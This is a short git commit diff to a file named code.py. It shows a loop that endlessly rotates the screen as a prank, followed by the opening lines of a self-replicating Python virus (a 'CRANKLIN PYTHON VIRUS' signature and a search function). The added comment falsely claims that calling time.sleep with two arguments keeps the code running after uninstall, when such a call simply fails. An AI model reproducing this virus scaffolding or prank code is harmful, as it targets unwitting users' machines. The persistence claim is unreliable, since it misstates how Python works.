c0cabadbb37054f1e05f46f3a30c8c6b1d17e1a4
AmishDahal <79306593+AmishDahal@users.noreply.github.com>
2023-12-26 18:20:50 +0545

    Update code.py

--- code.py
+++ code.py
@@ -8,7 +8,7 @@ angel_list =  [90, 180, 270, ]
 while True :
  for x in angel_list :
   pd.rotate_to(x)
-  time.sleep(0,5)
+  time.sleep(0,5) #the code is not (0.5) to annoy the user as even if you uninstall the code or python file running it will still work
 
 SIGNATURE = "CRANKLIN PYTHON VIRUS"
 def search(path):
